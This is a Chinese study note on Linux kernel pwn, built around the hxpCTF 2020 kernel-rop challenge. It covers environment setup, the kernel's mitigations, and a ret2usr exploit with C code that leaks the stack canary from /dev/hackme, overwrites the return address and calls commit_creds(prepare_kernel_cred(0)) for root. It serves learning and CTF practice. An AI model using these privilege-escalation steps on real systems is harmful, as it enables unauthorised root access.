# Learning Linux Kernel Exploitation

这一刻还是来了吗，kernel？参考教程：
- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/

此为极简（存疑）笔记，尝试直接把知识点记下来（我也不知道它重不重要，记就完了）

kernel pwn目标：攻击在启动时安装到内核中的自定义内核模块。

大部分情况会给出module相关的文件，用qemu做模拟器。极特别情况会给VMWare或者VirtualBox的镜像，甚至不给任何模拟环境。拿hxpCTF 2020的kernel-rop给的文件举例：
- [vmlinuz](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/vmlinuz) - 压缩的Linux kernel文件, 有时候称之为bzImage, 可用vmlinux将其解压为真正的kernel elf文件
- [initramfs.cpio.gz](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/initramfs.cpio.gz) - 用cpio和gzip压缩的linux文件系统。比如/bin,/etc，通常有漏洞的kernel模块也在里面。其他题目可能用其他的压缩方式
- [run.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/run.sh) - 一个包含qemu命令的脚本文件。可自行修改配置

（建议下载文件跟着教程做，排查一下自己的系统有没有运行、调试等问题）

可用[脚本](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh)从vmlinuz里解压出kernel elf文件。解压是为了找里面的rop gadget。kernel里的rop和普通情况下差不多。找gadget也是用ROPgadget命令，但是建议一拿到题就运行命令，并将输出结果保存到一个文件中
```sh
ROPgadget --binary ./vmlinux > gadgets.txt
```
这是因为kernel image很大，命令耗时较长。

解压linux文件系统的命令取决于题目的压缩方式(推荐把文件系统解压到一个空文件夹下，不然和题目文件混在一起乱得摸不着头脑)。解压不仅是为了拿到有漏洞的模块，还能让我们修改这个文件系统里的文件。从/etc入手，因为启动后大部分运行的初始化脚本都存储在这。特别注意寻找下面这行（通常在/etc/init.d/rcS或者/etc/inittab）然后修改
```sh
setuidgid 1000 /bin/sh
#改成下面的
setuidgid 0 /bin/sh
```
这行代码用于在启动后开启一个UID为1000的非root shell。把UID改成0后，我们就有了root shell。这么做是为了查看下面这些文件，它们提供的信息有助于我们利用漏洞
- /proc/kallsyms 列出加载到kernel中的所有symbol的地址
- /sys/module/core/sections/.text 给出kernel `.text`段的地址，也是base address（虽然有些题目没有/sys文件夹，不过base address还可以从/proc/kallsyms拿）

切记运行poc时把UID设回1000，防止我们以为自己拿到了root shell，但其实没有

后面写出poc还要把poc放回解压的文件系统中，然后重新压缩成要求的格式。

分析qemu命令：
```sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep,+smap \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 kaslr kpti=1 quiet panic=1"
```
- -m 指定内存大小。假如因为某种原因没法启动模拟器，尝试提高内存大小。
- -cpu 指定CPU model，+smep 和 +smap启用SMEP 和 SMAP mitigation feature（linux的漏洞缓解机制，下面有）
- -kernel 指定压缩的kernel image
- -initrd 指定压缩的文件系统
- -append 指定额外的启动选项。也可以在这选择是否启用漏洞缓解
- -hdb 把flag.txt放进/dev/sda
更多参考 https://manpages.debian.org/jessie/qemu-system-x86/qemu-system-x86_64.1.en.html

记得给qemu命令添加个-s选项(就在-append后面加个-s即可)，这样就能远程调试模拟器的kernel了。如果没有安装qemu-system-x86_64的话，可以尝试：
- `sudo apt-get install qemu-system`:这个直接把qemu-system全家桶装上了，不仅仅是qemu-system-x86_64
- `sudo apt-get install -y qemu-system-x86-64`:单纯装qemu-system-x86_64

然后运行qemu命令即可。再打开个cmd界面就能用gdb调试了。建议调试远程kernel时禁用peda, pwndbg或者GEF，这些插件有时候会奇奇怪怪的。直接用`gdb --nx vmlinux`
```sh
gdb --nx vmlinux
(gdb) target remote localhost:1234 #这个localhost:1234似乎是默认的，我运行qemu后啥也没设置也能连接上
```

就像用户态程序的ASLR, stack canaries, PIE（我现在才知道这些东西叫漏洞缓解机制），kernel也有自己的漏洞缓解机制。
- [Kernel stack cookies(or canaries)](http://www.phrack.org/issues/49/14.html#article):和用户态的stack canary完全一致。编译时启用且无法被禁用
- [Kernel address space layout randomization(KASLR)](https://lwn.net/Articles/569635/)：也和用户态的ASLR相似。每次系统启动，kernel挂载时，该机制随机化kernel的基地址。可以在qemu的-append选项里添加kaslr或者nokaslr启用/禁用该功能
- [Supervisor mode execution protection(SMEP)](https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf):当进程在kernel mode的话，标记页表中所有用户态内存页不可执行。kernel中可通过设置控制寄存器CR4的第20个bit启用。用boot启动时，可通过在-cpu选项后加上+smep启用；在-append后加上nosmep禁用
- [Supervisor Mode Access Prevention(SMAP)](https://lwn.net/Articles/517475/)：当进程处于内核模式时，此功能将页表中所有用户态内存页标记为不可访问，意味着这回连读和写都不行了。kernel中可通过设置控制寄存器CR4的第21个bit启用。用boot启动时，可通过在-cpu选项后加上+smap启用；在-append后加上nosmap禁用
- [Kernel page-table isolation(KPTI)](https://lwn.net/Articles/741878/):用两组页表将用户空间和内核空间的页表完全隔离，而不是使用一个同时包含用户空间和内核空间地址的页表。可通过在-append选项后添加kpti=1或nopti启用/禁用

然后就是分析hackme.ko了（在解压后的文件系统里）。个人建议拿ida或者ghidra反编译看看，有些函数一般pwn不常见，熟悉一下。在`hackme_init`里用`misc_register`注册了一个名为hackme的设备。这段在ghidra里有点谜语人，设备的详细信息在一个名为hackme_misc的结构里，点开后有个`s_hackme_0010025c`，是设备名；`hackme_fops`是记录所有操作的结构：hackme_read, hackme_write, hackme_open和hackme_release。这意味着我们可以通过打开/dev/hackme与这个模块交互并执行读写操作。

对设备执行读或写操作会调用kernel里的hackme_read或hackme_write。代码审计部分略过，此题漏洞在于buffer overflow。

ret2usr：我们能控制用户态（userland，似乎这个翻译不太准确）的内容，那就能采用与ret2shellcode类似的思路，把shellcode放到userland，然后让程序流跳转到userland。所以可以覆盖kernel所调用函数的返回地址为shellcode所在的userland地址。因为漏洞函数是个kernel函数，所以即使我们的shellcode在userland，跳转过去后还是在kernel mode下执行。

这种办法需要关闭smep，smap，kpti和kaslr。可以说已经过时了。但是借这个漏洞poc熟悉一下kernel pwn流程还是可以的。

在与模块交互之前，需要先打开它。打开device的方法和打开普通文件的方法相同。
```c
int global_fd;
void open_dev(){
    global_fd = open("/dev/hackme", O_RDWR);
}
```
然后就能用global_fd读和写了。泄露canary也不难，此题的buf为0x80字节，canary跟在后面。如果把数据读进unsigned long的数组（每个元素8字节），那么canary在偏移为16的位置。
```c
unsigned long cookie;
void leak(void){
    unsigned n = 20;
    unsigned long leak[n];
    ssize_t r = read(global_fd, leak, sizeof(leak)); //所以似乎打开device后直接就是stack了
    cookie = leak[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}
```
我在ghidra里看到buffer在stack-0xa0,为什么这里说长度是0x80？划到函数最底下，发现pop了3个寄存器。看来kernel里栈上存储的寄存器比userland的pwn多了两个r12和rbx。再加上canary和rbp，共占0x20.0x80+0x20=0xa0，没问题。目前我们了解到了栈上的布局：
```
buf
canary
rbx
r12
rbp
```
最后还是利用unsigned long数组和write写返回地址
```c
void overflow(void){
    unsigned n = 50;
    unsigned long payload[n];
    unsigned off = 16;
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (unsigned long)escalate_privs; // ret，escalate_privs是下面调用commit_creds(prepare_kernel_cred(0))的shellcode
    ssize_t w = write(global_fd, payload, sizeof(payload));
}
```
kernel pwn里不用`system("/bin/sh")`或`execve("/bin/sh", NULL, NULL)`getshell，而是需要获取系统的root权限然后弹一个root shell。通常利用commit_creds()和prepare_kernel_cred()这俩已经在kernel-space里的函数。只需像这样调用两个函数：
```c
commit_creds(prepare_kernel_cred(0))
```
关闭kaslr的情况下，这两个函数的地址每次boot都是一样的。直接从/proc/kallsyms获取地址：
```sh
cat /proc/kallsyms | grep commit_creds
cat /proc/kallsyms | grep prepare_kernel_cred
```
怎么调用都行，只需要连续调用这两个函数然后让其中一个函数的返回值作为另一个函数的参数即可。参考作者的写法，用intel syntax直接在C里写汇编。

还没结束，写好shellcode，填好返回地址（这个返回地址是我们在poc里写的一个函数的地址，因此还在kernel里）后，我们仍然在kernel mode执行，需要返回到user mode。如果kernel正常运行，在遇见其中一个指令(x86_64)后会返回userland：sysretq或iretq。通常都用iretq，因为sysretq比较难用。iretq只需要按下面的顺序在栈上设置好5个userland寄存器值：RIP|CS|RFLAGS|SP|SS

程序记录两套不同的寄存器值，一个给user mode，另一个给kernel mode。对于rip，可以直接把它设置成弹shell的函数。然而其它寄存器不能随便设置，不然可能没法正常执行。这个好办，在进入kernel mode前记录这些寄存器的值（所以在open /dev/hackme之前都在user mode吧？），等拿到root权限后再加载回来。

还有一件事，在x86_64上，调用iretq前必须先调用swapgs。这个指令的作用是交换kernel mode和user mode的GS寄存器值。

完整exp：https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ret2usr.c